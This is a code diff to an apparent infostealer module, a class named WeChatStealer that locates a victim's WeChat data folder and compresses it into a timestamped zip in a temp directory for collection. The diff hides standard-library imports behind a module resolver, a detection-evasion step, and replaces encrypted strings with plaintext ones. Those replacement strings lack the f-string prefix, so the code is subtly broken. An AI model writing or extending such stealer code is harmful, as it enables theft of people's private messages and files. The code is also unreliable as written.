@@ -1,9 +1,12 @@
-import os
-import shutil
-import zipfile
-import time
-from typing import Dict
-from core.obfuscation import decrypt_string
+from core.resolver import (
+    Resolver, _OS, _SHUTIL, _ZIPFILE, _TIME, _TYPING
+)
+os = Resolver.get_mod(_OS)
+shutil = Resolver.get_mod(_SHUTIL)
+zipfile = Resolver.get_mod(_ZIPFILE)
+time = Resolver.get_mod(_TIME)
+typing_mod = Resolver.get_mod(_TYPING)
+Dict = typing_mod.Dict
 from core.base import BaseModule
 
 class WeChatStealer(BaseModule):
@@ -50,7 +53,7 @@ class WeChatStealer(BaseModule):
         if not found_path:
             return result
         try:
-            zip_path = os.path.join(self.temp_dir, decrypt_string("GVcbAy8lBhkzGR4QBlALH0BGEQYreXBLJ1kQUQI="))
+            zip_path = os.path.join(self.temp_dir, "wechat_{int(time.time())}.zip")
             total_size_val: int = 0
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for root, dirs, files in os.walk(str(found_path)):
@@ -75,5 +78,5 @@ class WeChatStealer(BaseModule):
                 result['size_mb'] = float(final_size) / (1024.0 * 1024.0)
                 result['zip_path'] = str(zip_path)
         except Exception as e:
-            print(decrypt_string("NRMlSxk0Ggo7A0pdAEsJCFQSAw4z"))
+            print("[!] WeChat error: {e}")
         return result
